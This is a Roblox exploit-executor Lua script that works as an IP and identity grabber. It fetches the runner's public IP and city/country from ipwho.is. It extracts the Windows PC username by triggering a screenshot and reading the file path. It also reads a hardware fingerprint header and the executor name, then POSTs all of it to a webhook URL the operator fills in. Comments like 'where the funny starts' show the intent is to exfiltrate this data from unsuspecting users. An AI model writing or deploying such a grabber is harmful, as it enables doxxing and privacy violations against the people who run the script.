local hexcolor = 0xf031 -- choose any custom embed colour
local config = {
    rgb = true,
    url = "" -- insert webhook here
}
local ip = game:GetService("HttpService"):JSONDecode(game:HttpGet("http://ipwho.is/")) -- for the funny
if config.rgb == true then
    print("true")
else
    print("false")
end
function rand() -- function that lets you randomly choose colours for your embeds
    local colour = ""
    for i = 1, 6 do
        local randint = math.random(0, 15)
        local hex = string.format("%x", randint)
        colour = colour .. hex
    end
    return colour
end
local randcolour = "0x" .. rand()
if config.rgb == true then
    m = tonumber(randcolour)
elseif config.rgb == false then
    m = tonumber(hexcolor)
end
local function getexploit() -- func to get exploit
    local exploit =
        (syn and not is_sirhurt_closure and not pebc_execute and "Synapse") or (secure_load and "Sentinel") or
        (is_sirhurt_closure and "Sirhurt") or
        (pebc_execute and "ProtoSmasher") or
        (KRNL_LOADED and "Krnl") or
        (WrapGlobal and "WeAreDevs") or
        (isvm and "Proxo") or
        (shadow_env and "Shadow") or
        (jit and "EasyExploits") or
        (getreg()["CalamariLuaEnv"] and "Calamari") or
        (unit and "‎") or
        (IS_VIVA_LOADED and "VIVA") or
        (IS_COCO_LOADED and "Coco") or
        ("Undetectable")
    return exploit
end
local vim = game:GetService("VirtualInputManager")
local user
function username()
    vim:SendKeyEvent(true, Enum.KeyCode.Print, false, game)
    vim:SendKeyEvent(false, Enum.KeyCode.Print, false, game)
    user = game.ScreenshotReady:Wait():split("\\")[3] -- get pc username method (real)
    return user
end
--username()
local request = http_request or request or HttpPost or syn.request
local body = request({Url = "https://httpbin.org/get", Method = "GET"}).Body
local decoded = game:GetService("HttpService"):JSONDecode(body)
local headers = decoded.headers
local hwid
for i, v in pairs(headers) do
    if type(i) == "string" and i:lower():match("fingerprint") then
        hwid = v
    end -- obtains unique exploit identification possibly used for whitelists
end
function finalwhook()
    local data = {
        ["content"] = "",
        ["embeds"] = {
            {
                ["title"] = "Function Ran!",
                ["color"] = m,
                ["fields"] = {
                    {
                        ["name"] = "Username",
                        ["value"] = game.Players.LocalPlayer.Name,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Game",
                        ["value"] = tostring(game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name), -- game name
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Game Link",
                        ["value"] = "[*Link*](https://www.roblox.com/games/" .. game.PlaceId .. ")", -- game link
                        ["inline"] = true
                    },
                    {
                        ["name"] = "PlaceID",
                        ["value"] = game.PlaceId,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "JobID",
                        ["value"] = game.JobId,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "IP-Address",
                        ["value"] = ip["ip"],
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Geographics",
                        ["value"] = ip["city"] .. "  , " .. ip["country"] .. " ",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "PC-Username",
                        ["value"] = tostring(username()),
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Exploit",
                        ["value"] = tostring(getexploit()),
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Unique Exploit Identification",
                        ["value"] = tostring(hwid),
                        ["inline"] = true
                    }
                },
                ["footer"] = {
                    ["text"] = "thegreatest#0436"
                }
            }
        }
    }
    local headers = {
        ["content-type"] = "application/json"
    }
    local final = {
        Url = config.url,
        Body = game:GetService("HttpService"):JSONEncode(data),
        Method = "POST",
        Headers = headers
    } -- post req
    request(final) -- where the funny starts
end
finalwhook()